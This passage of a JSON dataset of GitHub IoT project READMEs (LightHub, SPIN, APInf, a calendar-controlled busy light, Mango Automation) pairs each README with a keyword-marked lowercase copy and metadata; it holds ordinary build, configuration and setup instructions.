with OpenHab and HomeRemote)\nScalability of Lighthub is virtually unlimited: Setup so many controllers you needed in most convenient places of your house - MQTT broker will allow controllers communicate each other and with Openhab/NodeRed/HomeRemote and propagate commands across network.\nPlease refer to our Wiki for insructions.\nRussian-language Wiki\nCompiling and flashing\nConfiguring\nChannel commands\nOpenHab integration\nDoxygen developers documentation\nLatest Release notes\nPlatforms specific details:\nAVR version (Arduino Mega) is basic, long time in production and have all functions\nDMX-out is software (DMXSimple) on pin3, can be re-defined to PIN 18 (USART1 TX)\nDMX-in - hardware\nWIZNET 5100 and 5500 Ethernets are supported\nModbus on USART2\nSAM3X8E (Arduino DUE): (Tested. In production. Recomended hardware at current moment)\ndefault PWM out frequency\nboth, DMX-in and DMX-out are hardware USART based. Use USART1 (pins 18 and 19) for DMX-out and DMX-in\nWIZNET 5100 and 5500 Ethernets are supported\nModbus on USART2\nESP8266, ESP32: (Tested)\nDMX-OUT on USART1 TX\nDMX-IN - disabled - not possible to deploy in ESP8266\nModbus - disabled on ESP8266, Might be configured in future on USART0 instead CLI/DEBUG, on ESP32 binded with UART2\nUses Wifi interface instead wired connection\nNRF52840 : Still early development stage\nCustom build flags\nMY_CONFIG_SERVER=192.168.1.1 // address of external JSON-config http://192.168.1.1/de-ad-be-ef-fe-00.config.json\nWATCH_DOG_TICKER_DISABLE //disable wdt feature\nUSE_1W_PIN=49 // use direct connection to 1W devices on 49 pin, no I2C bridge DS2482-100\nSD_CARD_INSERTED // enable sd-card support and fix lan starting\nSERIAL_BAUD=115200 // set baud rate for console on Serial0\nWiz5500 //Use Wiznet 5500 library instead universal Wiznet\nWiz5100 //Use Wiznet 5500 library instead universal Wiznet\nDISABLE_FREERAM_PRINT // disable printing free Ram in bytes\nCUSTOM_FIRMWARE_MAC=de:ad:be:ef:fe:00 //set firmware macaddress\nDMX_DISABLE //disable DMX support\nMODBUS_DISABLE // disable old Modbus driver\nMBUS_DISABLE // disable new Modbus driver\nMODBUS_TX_PIN=13\nOWIRE_DISABLE // disable OneWire support\nARTNET_ENABLE //Enable Artnet protocol support\nAVR_DMXOUT_PIN=18 // Set Pin for DMXOUT on megaatmega2560\nCONTROLLINO //Change Modbus port, direction pins and Wiznet SS pins to be working on Controllino\nLAN_INIT_DELAY=2000 // set lan init delay for Wiznet ethernet shield\nESP_WIFI_AP=MYAP // esp wifi access point name\nESP_WIFI_PWD=MYPWD // esp wifi access point password\nWIFI_MANAGER_DISABLE //Disable wifi manager for esp8266\nCOUNTER_DISABLE //disable Counter, Uptime input support (for RAM savings on mega2560)\nDHT_DISABLE //disable DHT input support (for RAM savings on mega2560)\nPID_DISABLE // Disable PID regulator\nSTATUSLED // Enable RGB status led on pins 50,51,52 (DUE only)\nDMX_SMOOTH //Smooth transition on DMX channels (DUE only)\nOTA // Enable Other The Air firmware upload\nW5500_CS_PIN=53 //Defines CS pin for Ethernet adapter (10-th by default)\nWIFI_ENABLE //Enable WiFi for ESP (Wiznet by default)\nSPILED_DISABLE //Disable SPI LED library\nAC_DISABLE //Disable UART Hayer Air condition driver\nM5STACK //Logging to M5Stack OLED screen\nNO_HOMIE //Disable HOMIE discovery topics\nBRIGHT_STEP //Scale DMX bright - Table1\nBRIGHT_LOG //Scale DMX bright - Table2\nMCP23017 allow I2C input port extender on MCP23017 chip\nRESTART_LAN_ON_MQTT_ERRORS //reinit LAN if many mqtt errors occured\nDEVICE_NAME short handy device name which is used instead of mac for download config http://{MY_CONFIG_SERVER}/{DEVICE_NAME}_config.json\nSYSLOG_ENABLE enable UDP SYSLOG support feature(under DEVELOPMENT) that must be configured through config file\nWITH_PRINTEX_LIB use PrintEx library (develop experimental feature)\nCSSHDC_DISABLE //Disable CS811 and HDC1080 sensors support\nFASTLED - using FASTLED library instead default ADAFRUIT_LED\nSCALE_VOLUME_100 using 0..100 scaling in /set topics instead 0.255 (default)\nDefault compilation behavior:\nConfig server: lazyhome.ru (hosting of config files available for all registred users of portal - see MyDevices tab)\nWatchdog enabled\n1-Wire communication with DS2482-100 I2C driver\nNo SD\nSerial speed 115200\nWiznet 5100 (for MEGA & DUE)\nFree Ram printing enabled\nde:ad:be:ef:fe:ff default MAC address for MEGA (on ESPx, DUE - using hardware defined MAC by default)\nDMX support enabled\nModbus support enabled\nOneWire support enabled\nArtnet disabled\nLAN_INIT_DELAY=500 //ms\nDefailt MQTT broadcast input topic: myhome/in\nDefault MQTT topic to publish device status: myhome/s_out\nDefault Alarm output topic: alarm\nDHT, Counter, Uptime support enabled\nWifi manager for esp8266/esp32 enabled\nRESTART_LAN_ON_MQTT_ERRORS disabled\nDEVICE_NAME disabled\nSYSLOG_ENABLE disabled\nWITH_PRINTEX_LIB disabled, using Streaming library\nCS811 and HDC1080 sensors support are enabled", "link": "https://github.com/anklimov/lighthub", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "lighthub\nis flexible, arduino-mega/arduino due/esp8266/esp32 open-software and open-hardware smarthome controller. ru home-site ru it may operate both:\non especially designed hardware board with 16 optocoupled digital inputs, 16 esd protected digital/analog inputs/outputs, 8 open-collector outputs (up to 0.5a/50v), dmx in/out, modbus rtu and hardware 1-wire support circuit.\non plain arduino mega 2560, arduino due, esp8266, esp32 and even on controllino (controllino is not tested enough)\nlighthub allows connecting together:\ncontact sensors (switches, buttons etc)\nanalog sensors (leak detectors, knobs etc)\n1-wire temperature sensors (up to 20 on single bus)\ntemperature/humidity/co2 sensors: dht22, cs811, hdc1080 and any type of modbus connected devices\nstandard nonexpensive relay board with ttl inputs, like this to control ac powered lamps, floor heaters, boilers etc\nstandard nonexpensive led dimmers and ac dmx-512 dimmers\nmodbus rtu devices (currently, possible to control two types of modbus devices: ac dimmer and ventilation set (based on vacon 10 controller) and configure polling of virtually any modbus device.\nsimple dmx wall sensor panel like this\nlist of non-expensive compatible components from aliexpress here\nwhere is possible both, to configure local control/mapping between inputs and outputs (light, floor heating thermostats) and remote control from mqtt enabled software and between controllers. at the moment, lighthub tested and perfectly working with following set of complementary free software:\nhomeassistant - the best choice of homeautomation system\nopenhab or openhab2 smarthome software openhab provides own native mobile app both, for ios and android, and even allow you to use apple's homekit and google home to say \"siri, turn on light in bedroom\" or \"hey google, set bedroom light to red\" but requires some server to be installed in-premises (raspberry pi with openhabian will good enough)\nhomeremote mobile client home remote mobile applicatios for ios and android requires just mqtt broker to be working. any cloud-based mqtt broker, like cloudmqtt will enough to serve average household, even with free account.\nnode-red possibly, the best solution to deploy event-based authomation and scripting on top of mqtt/lighthub. the easy to use universal and visual -----> tool !!!  to wire many different devices in single system. having own dashbord which allow control from web/mobile web, even without mobile apps (excelent co-working with openhab and homeremote)\nscalability of lighthub is virtually unlimited: setup so many controllers you needed in most convenient places of your house - mqtt broker will allow controllers communicate each other and with openhab/nodered/homeremote and propagate commands across network.\nplease refer to our wiki for insructions.\nrussian-language wiki\ncompiling and flashing\nconfiguring\nchannel commands\nopenhab integration\ndoxygen developers documentation\nlatest release notes\nplatforms specific details:\navr version (arduino mega) is basic, long time in production and have all functions\ndmx-out is software (dmxsimple) on pin3, can be re-defined to pin 18 (usart1 tx)\ndmx-in - hardware\nwiznet 5100 and 5500 ethernets are supported\nmodbus on usart2\nsam3x8e (arduino due): (tested. in production. recomended hardware at current moment)\ndefault pwm out frequency\nboth, dmx-in and dmx-out are hardware usart based. use usart1 (pins 18 and 19) for dmx-out and dmx-in\nwiznet 5100 and 5500 ethernets are supported\nmodbus on usart2\nesp8266, esp32: (tested)\ndmx-out on usart1 tx\ndmx-in - disabled - not possible to deploy in esp8266\nmodbus - disabled on esp8266, might be configured in future on usart0 instead cli/debug, on esp32 binded with uart2\nuses wifi interface instead wired connection\nnrf52840 : still early development stage\ncustom build flags\nmy_config_server=192.168.1.1 // address of external json-config http://192.168.1.1/de-ad-be-ef-fe-00.config.json\nwatch_dog_ticker_disable //disable wdt feature\nuse_1w_pin=49 // use direct connection to 1w devices on 49 pin, no i2c bridge ds2482-100\nsd_card_inserted // enable sd-card support and fix lan starting\nserial_baud=115200 // set baud rate for console on serial0\nwiz5500 //use wiznet 5500 library instead universal wiznet\nwiz5100 //use wiznet 5500 library instead universal wiznet\ndisable_freeram_print // disable printing free ram in bytes\ncustom_firmware_mac=de:ad:be:ef:fe:00 //set firmware macaddress\ndmx_disable //disable dmx support\nmodbus_disable // disable old modbus driver\nmbus_disable // disable new modbus driver\nmodbus_tx_pin=13\nowire_disable // disable onewire support\nartnet_enable //enable artnet protocol support\navr_dmxout_pin=18 // set pin for dmxout on megaatmega2560\ncontrollino //change modbus port, direction pins and wiznet ss pins to be working on controllino\nlan_init_delay=2000 // set lan init delay for wiznet ethernet shield\nesp_wifi_ap=myap // esp wifi access point name\nesp_wifi_pwd=mypwd // esp wifi access point password\nwifi_manager_disable //disable wifi manager for esp8266\ncounter_disable //disable counter, uptime input support (for ram savings on mega2560)\ndht_disable //disable dht input support (for ram savings on mega2560)\npid_disable // disable pid regulator\nstatusled // enable rgb status led on pins 50,51,52 (due only)\ndmx_smooth //smooth transition on dmx channels (due only)\nota // enable other the air firmware upload\nw5500_cs_pin=53 //defines cs pin for ethernet adapter (10-th by default)\nwifi_enable //enable wifi for esp (wiznet by default)\nspiled_disable //disable spi led library\nac_disable //disable uart hayer air condition driver\nm5stack //logging to m5stack oled screen\nno_homie //disable homie discovery topics\nbright_step //scale dmx bright - table1\nbright_log //scale dmx bright - table2\nmcp23017 allow i2c input port extender on mcp23017 chip\nrestart_lan_on_mqtt_errors //reinit lan if many mqtt errors occured\ndevice_name short handy device name which is used instead of mac for download config http://{my_config_server}/{device_name}_config.json\nsyslog_enable enable udp syslog support feature(under development) that must be configured through config file\nwith_printex_lib use printex library (develop experimental feature)\ncsshdc_disable //disable cs811 and hdc1080 sensors support\nfastled - using fastled library instead default adafruit_led\nscale_volume_100 using 0..100 scaling in /set topics instead 0.255 (default)\ndefault compilation behavior:\nconfig server: lazyhome.ru (hosting of config files available for all registred users of portal - see mydevices tab)\nwatchdog enabled\n1-wire communication with ds2482-100 i2c driver\nno sd\nserial speed 115200\nwiznet 5100 (for mega & due)\nfree ram printing enabled\nde:ad:be:ef:fe:ff default mac address for mega (on espx, due - using hardware defined mac by default)\ndmx support enabled\nmodbus support enabled\nonewire support enabled\nartnet disabled\nlan_init_delay=500 //ms\ndefailt mqtt broadcast input topic: myhome/in\ndefault mqtt topic to publish device status: myhome/s_out\ndefault alarm output topic: alarm\ndht, counter, uptime support enabled\nwifi manager for esp8266/esp32 enabled\nrestart_lan_on_mqtt_errors disabled\ndevice_name disabled\nsyslog_enable disabled\nwith_printex_lib disabled, using streaming library\ncs811 and hdc1080 sensors support are enabled", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000646, "year": null}, {"Unnamed: 0": 655, "autor": 655, "date": null, "content": "This is a prototype of the SPIN platform.\nWhat is SPIN?\nThis software is part of the SPIN project.\nSPIN stands for Security and Privacy for In-home Networks, it is a traffic visualization tool and analysis tool intended to help protect the home network with an eye on the Internet of Things devices and the security problems they might bring.\nCurrently, the SPIN prototype is implemented as a package that can be run on either a Linux system or an OpenWRT-based router; it can show network activity in a graphical interface, and has the option to block traffic on top of existing firewall functionality.\nFor a screenshot, see here.\nBuilding the source code\nThe SPIN prototype is tested on OpenWRT, Debian and Raspbian systems.\nIt also comes bundled with the Valibox router image software, available as pre-built images for GL-Inet AR-150, VirtualBox, and the Raspberry Pi 3. See the Valibox website\nOn (Linux) PC\nDependencies\ngcc\nmake\nautoconf\nlibnfnetlink-dev\nlibnetfilter-conntrack-dev\nlibnetfilter-queue-dev\nlibnetfilter-log-dev\nlibldns-dev\nlibmicrohttpd-dev\napt-get install gcc make autoconf libnfnetlink-dev libmnl-dev libnetfilter-queue-dev libldns-dev libmicrohttpd-dev libnetfilter-log-dev libnetfilter-conntrack-dev\nLibrary dependencies:\nlibnetfilter-log1\nlibnetfilter-queue1\nlibnfnetlink0\nlibmnl\napt-get install libnetfilter-log1 libnetfilter-queue1 libnfnetlink0 libmnl0\nRuntime dependencies:\nipset\nmosquitto (or any MQTT software that supports websockets as well)\nkernel modules for conntrack and netfilter\nFor the traffic capture functionality you'll also need:\ntcpdump\nBuilding\nRun in the source dir:\nautoreconf --install\nmkdir build\n(cd build; ../configure && make)\nRunning from source tree\nTo run SPIN, you need to run two daemons; spind to collect data, and spinweb to serve the interface and process user commands. You'll also need an MQTT server, such as mosquitto, with websockets support on port 1884 (as well as plain MQTT on port 1883). MQTT is used to publish traffic data monitored by the SPIN daemon.\nThe SPIN system is most useful when run on a gateway; there are several instructions on the web on how to set up a Debian system as a gateway. One example is https://gridscale.io/en/community/tutorials/debian-router-gateway/.\nTo run spind from the source tree, with stdout output and debug logging, use: (sudo) (cd ./src/build/spind/; ./spind -o -d)\nTo run the webserver, use: (cd ./src/build/spinweb; ./spinweb)\nNote that the actual current working directory for spinweb must be the build directory of spinweb itself, as it needs the relative links to template files to be correct when run from the build tree. This is not an issue when SPIN is installed to the system.\nSystem\nSPIN sends its data to MQTT, which any MQTT client can then read. A web-based client ('the bubble app') can be served with the spinweb daemon in src/build/spinweb/, the main HTML file is spin_graph/graph.html, and depending on where you host it. By default it listens to localhost only, on port 13026. You can access it from a browser with the URL http://localhost:13026/spin_graph/graph.html if spind is running. When running on a different system, you will need to configure spinweb to listen on the local network interface through either the configuration file or with the command-line option '-i'.\nSpinweb also provides a method to send commands to the SPIN daemon. A client command script can be found in the scripts/ directory.\nFor OpenWRT\nIf you have a build environment for OpenWRT (see https://wiki.openwrt.org/doc/howto/build), you can add the following feed to the feeds.conf file: src-git sidn https://github.com/SIDN/sidn_openwrt_pkgs\nAfter running scripts/feeds update and scripts/feeds install, you can select the spin package in menuconfig under Network->SIDN->spin.\nRunning make package/spin/compile and make package/spin install will result in a spin-.ipk file in bin/.\nThis package has an extra file in addition to the ones described in the previous section: a startup script /etc/init.d/spin; this script will load the kernel module and start the spin_mqtt.lua daemon.\nPlease keep in mind that for the 'bubble-app' front-end, you will also need to install a webserver, and configure it to serve the pages installed by the package in /usr/lib/spin/web_ui/static.\nOn OpenBSD\nOpenBSD is not fully supported at this time. For now, it is possible to compile spind and run with limited functionality (compared to the Linux/OpenWRT build).\nInstalling the dependencies:\n# pkg_add autoconf%2.69 automake%1.16 ldns-utils mosquitto\nCompiling spind:\n$ cd src\n$ AUTOCONF_VERSION=2.69 AUTOMAKE_VERSION=1.16 autoreconf --install\n$ mkdir build\n$ cd build\n$ CC=clang LDFLAGS=\"-L/usr/local/lib\" CFLAGS=\"-g -O0 -I/usr/local/include\" ../configure --enable-passive-mode-only\n$ find . -name Makefile | xargs sed -i -e 's/-Werror//g'\n$ AUTOCONF_VERSION=2.69 AUTOMAKE_VERSION=1.16 make\nRunning SPIN\nWhen the OpenWRT package is installed, SPIN should start automatically after a reboot. Simply use a browser to go to http://192.168.8.1:13026/spin_graph/graph.html to see it in action (assuming that the router that is running SPIN has the internal IP 192.168.8.1). You may need to configure the local interface and port in /etc/config/spin\nWhen installed locally, a few manual steps are required:\n(0. Configure your system to be a gateway, example instructions: https://gridscale.io/en/community/tutorials/debian-router-gateway/)\nConfigure and start an MQTT service; this needs to listen to port 1883 (mqtt) and 1884 (websockets protocol).\nLoad the relevant kernel modules: modprobe nf_conntrack nfnetlink_log nfnetlink_queue. On some systems, the conntrack modules are split into several separate modules, in which case you'll need to run modprobe on nf_conntrack_ipv4 and nf_conntrack_ipv6 as well. When you use SPIN in a bridge setting, load br_netfilter as well.\nEnable conntrack accounting: sysctl net.netfilter.nf_conntrack_acct=1\nStart the spin daemon (sudo) (cd ./src/build/spind/; spind -o -d)\nStart the spinweb daemon (cd ./src/build/spinweb/; ./spinweb\nLoad the spin bubble app by visiting http://127.0.0.1:13026/spin_graph/graph.html\nSPIN configuration\nBoth the collector (spind) and the web API (spinweb) can be configured through a single configuration file; by default this is /etc/spin/spind.conf. A subset of the options can be provided on the command-line as well. For an overview of the command-line options, call either spind -h or spinweb -h. Command-line arguments take precedence over configuration file values.\nThe configuration options are documented here\nWhen compiled with UCI/UBUS support in OpenWRT, the configuration is provided through UCI and the static configuration file is ignored. The configurable items are the same as with a static configuration file.\nHigh-level technical overview\nThe software contains three parts:\na daemon that aggregates traffic and DNS information (with nf_conntract and nflog) and sends it to MQTT\na web API\na html/javascript front-end for the user\nThe information that is sent to MQTT contains the following types:\nTraffic: information about traffic itself, source address, destination address, ports, and payload sizes\nBlocked: information about traffic that was blocked (by SPIN, not by the general firewall)\nDNS: domain names that have been resolved into IP addresses (so the visualizer can show which domain names were used to initiate traffic)\nThe daemon will also listen for configuration commands in the MQTT topic SPIN/commands. This will be replaces by RPC calls in the near future.\nData protocols and APIs\nMQTT messages\nFor the channels and mqtt message formats, see doc/mqtt_protocol.md\nWeb API\nFor the Web API description, see doc/web_api.md", "link": "https://github.com/SIDN/spin", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "this is a prototype of the spin platform.\nwhat is spin?\nthis software is part of the spin project.\nspin stands for security and privacy for in-home networks, it is a traffic visualization -----> tool !!!  and analysis -----> tool !!!  intended to help protect the home network with an eye on the internet of things devices and the security problems they might bring.\ncurrently, the spin prototype is implemented as a package that can be run on either a linux system or an openwrt-based router; it can show network activity in a graphical interface, and has the option to block traffic on top of existing firewall functionality.\nfor a screenshot, see here.\nbuilding the source code\nthe spin prototype is tested on openwrt, debian and raspbian systems.\nit also comes bundled with the valibox router image software, available as pre-built images for gl-inet ar-150, virtualbox, and the raspberry pi 3. see the valibox website\non (linux) pc\ndependencies\ngcc\nmake\nautoconf\nlibnfnetlink-dev\nlibnetfilter-conntrack-dev\nlibnetfilter-queue-dev\nlibnetfilter-log-dev\nlibldns-dev\nlibmicrohttpd-dev\napt-get install gcc make autoconf libnfnetlink-dev libmnl-dev libnetfilter-queue-dev libldns-dev libmicrohttpd-dev libnetfilter-log-dev libnetfilter-conntrack-dev\nlibrary dependencies:\nlibnetfilter-log1\nlibnetfilter-queue1\nlibnfnetlink0\nlibmnl\napt-get install libnetfilter-log1 libnetfilter-queue1 libnfnetlink0 libmnl0\nruntime dependencies:\nipset\nmosquitto (or any mqtt software that supports websockets as well)\nkernel modules for conntrack and netfilter\nfor the traffic capture functionality you'll also need:\ntcpdump\nbuilding\nrun in the source dir:\nautoreconf --install\nmkdir build\n(cd build; ../configure && make)\nrunning from source tree\nto run spin, you need to run two daemons; spind to collect data, and spinweb to serve the interface and process user commands. you'll also need an mqtt server, such as mosquitto, with websockets support on port 1884 (as well as plain mqtt on port 1883). mqtt is used to publish traffic data monitored by the spin daemon.\nthe spin system is most useful when run on a gateway; there are several instructions on the web on how to set up a debian system as a gateway. one example is https://gridscale.io/en/community/tutorials/debian-router-gateway/.\nto run spind from the source tree, with stdout output and debug logging, use: (sudo) (cd ./src/build/spind/; ./spind -o -d)\nto run the webserver, use: (cd ./src/build/spinweb; ./spinweb)\nnote that the actual current working directory for spinweb must be the build directory of spinweb itself, as it needs the relative links to template files to be correct when run from the build tree. this is not an issue when spin is installed to the system.\nsystem\nspin sends its data to mqtt, which any mqtt client can then read. a web-based client ('the bubble app') can be served with the spinweb daemon in src/build/spinweb/, the main html file is spin_graph/graph.html, and depending on where you host it. by default it listens to localhost only, on port 13026. you can access it from a browser with the url http://localhost:13026/spin_graph/graph.html if spind is running. when running on a different system, you will need to configure spinweb to listen on the local network interface through either the configuration file or with the command-line option '-i'.\nspinweb also provides a method to send commands to the spin daemon. a client command script can be found in the scripts/ directory.\nfor openwrt\nif you have a build environment for openwrt (see https://wiki.openwrt.org/doc/howto/build), you can add the following feed to the feeds.conf file: src-git sidn https://github.com/sidn/sidn_openwrt_pkgs\nafter running scripts/feeds update and scripts/feeds install, you can select the spin package in menuconfig under network->sidn->spin.\nrunning make package/spin/compile and make package/spin install will result in a spin-.ipk file in bin/.\nthis package has an extra file in addition to the ones described in the previous section: a startup script /etc/init.d/spin; this script will load the kernel module and start the spin_mqtt.lua daemon.\nplease keep in mind that for the 'bubble-app' front-end, you will also need to install a webserver, and configure it to serve the pages installed by the package in /usr/lib/spin/web_ui/static.\non openbsd\nopenbsd is not fully supported at this time. for now, it is possible to compile spind and run with limited functionality (compared to the linux/openwrt build).\ninstalling the dependencies:\n# pkg_add autoconf%2.69 automake%1.16 ldns-utils mosquitto\ncompiling spind:\n$ cd src\n$ autoconf_version=2.69 automake_version=1.16 autoreconf --install\n$ mkdir build\n$ cd build\n$ cc=clang ldflags=\"-l/usr/local/lib\" cflags=\"-g -o0 -i/usr/local/include\" ../configure --enable-passive-mode-only\n$ find . -name makefile | xargs sed -i -e 's/-werror//g'\n$ autoconf_version=2.69 automake_version=1.16 make\nrunning spin\nwhen the openwrt package is installed, spin should start automatically after a reboot. simply use a browser to go to http://192.168.8.1:13026/spin_graph/graph.html to see it in action (assuming that the router that is running spin has the internal ip 192.168.8.1). you may need to configure the local interface and port in /etc/config/spin\nwhen installed locally, a few manual steps are required:\n(0. configure your system to be a gateway, example instructions: https://gridscale.io/en/community/tutorials/debian-router-gateway/)\nconfigure and start an mqtt service; this needs to listen to port 1883 (mqtt) and 1884 (websockets protocol).\nload the relevant kernel modules: modprobe nf_conntrack nfnetlink_log nfnetlink_queue. on some systems, the conntrack modules are split into several separate modules, in which case you'll need to run modprobe on nf_conntrack_ipv4 and nf_conntrack_ipv6 as well. when you use spin in a bridge setting, load br_netfilter as well.\nenable conntrack accounting: sysctl net.netfilter.nf_conntrack_acct=1\nstart the spin daemon (sudo) (cd ./src/build/spind/; spind -o -d)\nstart the spinweb daemon (cd ./src/build/spinweb/; ./spinweb\nload the spin bubble app by visiting http://127.0.0.1:13026/spin_graph/graph.html\nspin configuration\nboth the collector (spind) and the web api (spinweb) can be configured through a single configuration file; by default this is /etc/spin/spind.conf. a subset of the options can be provided on the command-line as well. for an overview of the command-line options, call either spind -h or spinweb -h. command-line arguments take precedence over configuration file values.\nthe configuration options are documented here\nwhen compiled with uci/ubus support in openwrt, the configuration is provided through uci and the static configuration file is ignored. the configurable items are the same as with a static configuration file.\nhigh-level technical overview\nthe software contains three parts:\na daemon that aggregates traffic and dns information (with nf_conntract and nflog) and sends it to mqtt\na web api\na html/javascript front-end for the user\nthe information that is sent to mqtt contains the following types:\ntraffic: information about traffic itself, source address, destination address, ports, and payload sizes\nblocked: information about traffic that was blocked (by spin, not by the general firewall)\ndns: domain names that have been resolved into ip addresses (so the visualizer can show which domain names were used to initiate traffic)\nthe daemon will also listen for configuration commands in the mqtt topic spin/commands. this will be replaces by rpc calls in the near future.\ndata protocols and apis\nmqtt messages\nfor the channels and mqtt message formats, see doc/mqtt_protocol.md\nweb api\nfor the web api description, see doc/web_api.md", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000655, "year": null}, {"Unnamed: 0": 664, "autor": 664, "date": null, "content": "APInf API Management Framework\nTable of Contents generated with DocToc\nDocker image\nDevelopment status\nAutomated testing\nNightly build\nContributing\nLinks\nDocker image\nDocker images are hosted in Dockerhub: https://hub.docker.com/r/apinf/platform/tags\nAPInf API management\nThe APInf platform offers a comprehensive tool for API management. Building on APInf Umbrella, it provides enhanced user interface features for API managers and consumers alike.\nFor API consumers APInf provides simple key management, key usage analytics and API discovery along with API documentation. Managers have simplified workflow for common tasks, such as key management, rate limiting and viewing API usage analytics.\nWhy to use? If you have APIs and you are looking for additional control on API access, API documentation and analytics in one package, this is for you.\n\ud83d\udcc4 Site \ud83c\udf93 Academy \ud83d\udc33 Docker Hub \ud83c\udfaf Roadmap\nDevelopment status\nTesting\nFor automated testing we use Sauce Labs.\nNightly build\nYou can preview our latest version at nightly.apinf.io. Feel free to register an account and test things out.\nContributing\nPlease review our Contributor Guide for details on how to get involved with the project.\nPlease follow guidelines for community involvement in our Code of Conduct\nLinks\nMore about APInf: apinf.com.\nAPInf saas service: apinf.io.\nLicense\nAPInf is licensed under the EUPL-1.1 License.\nFIWARE GE\nAPInf API Management Framework is a FIWARE Generic Enabler. Therefore, it can be integrated as part of any platform \u201cPowered by FIWARE\u201d. FIWARE is a curated framework of open source platform components which can be assembled together with other third-party platform components to accelerate the development of Smart Solutions.\nYou can find more info at the FIWARE developers website and the FIWARE website.\nThe complete list of FIWARE GEs and Incubated FIWARE GEs can be found at the FIWARE Catalogue\n\u00a9 2019 APInf Oy", "link": "https://github.com/apinf/platform", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "apinf api management framework\ntable of contents generated with doctoc\ndocker image\ndevelopment status\nautomated testing\nnightly build\ncontributing\nlinks\ndocker image\ndocker images are hosted in dockerhub: https://hub.docker.com/r/apinf/platform/tags\napinf api management\nthe apinf platform offers a comprehensive -----> tool !!!  for api management. building on apinf umbrella, it provides enhanced user interface features for api managers and consumers alike.\nfor api consumers apinf provides simple key management, key usage analytics and api discovery along with api documentation. managers have simplified workflow for common tasks, such as key management, rate limiting and viewing api usage analytics.\nwhy to use? if you have apis and you are looking for additional control on api access, api documentation and analytics in one package, this is for you.\n\ud83d\udcc4 site \ud83c\udf93 academy \ud83d\udc33 docker hub \ud83c\udfaf roadmap\ndevelopment status\ntesting\nfor automated testing we use sauce labs.\nnightly build\nyou can preview our latest version at nightly.apinf.io. feel free to register an account and test things out.\ncontributing\nplease review our contributor guide for details on how to get involved with the project.\nplease follow guidelines for community involvement in our code of conduct\nlinks\nmore about apinf: apinf.com.\napinf saas service: apinf.io.\nlicense\napinf is licensed under the eupl-1.1 license.\nfiware ge\napinf api management framework is a fiware generic enabler. therefore, it can be integrated as part of any platform \u201cpowered by fiware\u201d. fiware is a curated framework of open source platform components which can be assembled together with other third-party platform components to accelerate the development of smart solutions.\nyou can find more info at the fiware developers website and the fiware website.\nthe complete list of fiware ges and incubated fiware ges can be found at the fiware catalogue\n\u00a9 2019 apinf oy", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000664, "year": null}, {"Unnamed: 0": 669, "autor": 669, "date": null, "content": "Let your family know you are in meetings with an IoT Busy light\nLike a lot of folks at the moment, I'm working for home and my child is off school.\nFor those reading this in the future and wondering why, I am currently living in the time of the COVID-19 pandemic and worldwide toilet paper shortages.\nOne of the upsides of working from home, especially when my 7 year old is off school is that I am available most of the time for the occasional quick cuddle, to laugh at something silly she'd just done or help her with something. One of the downsides is that at any time she could walk in to my office whilst I'm on a call.\nWhat I need is a on-air style light, to let her know when I'm in meetings and when I'm not. Luckily I'm an IoT nut so I not only have the skills to build such a thing, but I have all the parts just lying around begging me to use them! So I built one!\nWhat I needed it to do\nThis light needs to live outside my office so my family can see it before they come in, but I don't want to have to get up and walk out the door to turn it on or off. I want to have it controlled automatically by my calendar, so it shows red when I have a meeting and green when I'm free.\nThis leads to the problem of connectivity - how can my calendar control my light remotely. For that the answer was obvious - a mixture of Azure IoT Central, the glorious IoT SaaS platform from Microsoft, and Azure Logic Apps, a no-code tool for building apps. Both have such a low barrier to entry I knew I'd be able to get something up and running quickly.\nSteps\nTo set this up yourself, you need to set up some hardware, configure Azure IoT Central, program your Pi to talk to Azure IoT Central, then connect it to logic apps to control it via your calendar.\nSet up the hardware\nConfigure Azure IoT Central\nInstall the software on the Pi\nConnect an Azure Logic app to control the lights\nLearn more\nIf you want to learn more about Azure IoT and AI services, the best place to start is Microsoft Learn - our free on-line, self guided hands on learning experience.\nIoT Learning Paths on Microsoft Learn\nLogic app learning paths on Microsoft Learn", "link": "https://github.com/jimbobbennett/BusyLight", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "let your family know you are in meetings with an iot busy light\nlike a lot of folks at the moment, i'm working for home and my child is off school.\nfor those reading this in the future and wondering why, i am currently living in the time of the covid-19 pandemic and worldwide toilet paper shortages.\none of the upsides of working from home, especially when my 7 year old is off school is that i am available most of the time for the occasional quick cuddle, to laugh at something silly she'd just done or help her with something. one of the downsides is that at any time she could walk in to my office whilst i'm on a call.\nwhat i need is a on-air style light, to let her know when i'm in meetings and when i'm not. luckily i'm an iot nut so i not only have the skills to build such a thing, but i have all the parts just lying around begging me to use them! so i built one!\nwhat i needed it to do\nthis light needs to live outside my office so my family can see it before they come in, but i don't want to have to get up and walk out the door to turn it on or off. i want to have it controlled automatically by my calendar, so it shows red when i have a meeting and green when i'm free.\nthis leads to the problem of connectivity - how can my calendar control my light remotely. for that the answer was obvious - a mixture of azure iot central, the glorious iot saas platform from microsoft, and azure logic apps, a no-code -----> tool !!!  for building apps. both have such a low barrier to entry i knew i'd be able to get something up and running quickly.\nsteps\nto set this up yourself, you need to set up some hardware, configure azure iot central, program your pi to talk to azure iot central, then connect it to logic apps to control it via your calendar.\nset up the hardware\nconfigure azure iot central\ninstall the software on the pi\nconnect an azure logic app to control the lights\nlearn more\nif you want to learn more about azure iot and ai services, the best place to start is microsoft learn - our free on-line, self guided hands on learning experience.\niot learning paths on microsoft learn\nlogic app learning paths on microsoft learn", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000669, "year": null}, {"Unnamed: 0": 671, "autor": 671, "date": null, "content": "Mango Automation Core public code by Infinite Automation\nMango Automation is a full featured SCADA / HMI solution that offers complete flexibility no matter how large or small your needs are. Mango can be used in hundreds of configuration, from data protocol gateway to graphic user interface. With the Mango expansion modules in the Mango Automation store and the ability to build custom modules, you will find everything you need in Mango. Here is a list of the key features available.\nSpeed\nMango is a data logging, control, and monitoring system all in one featuring a browser-based interface. Yet, even on small embedded computers, Mango can 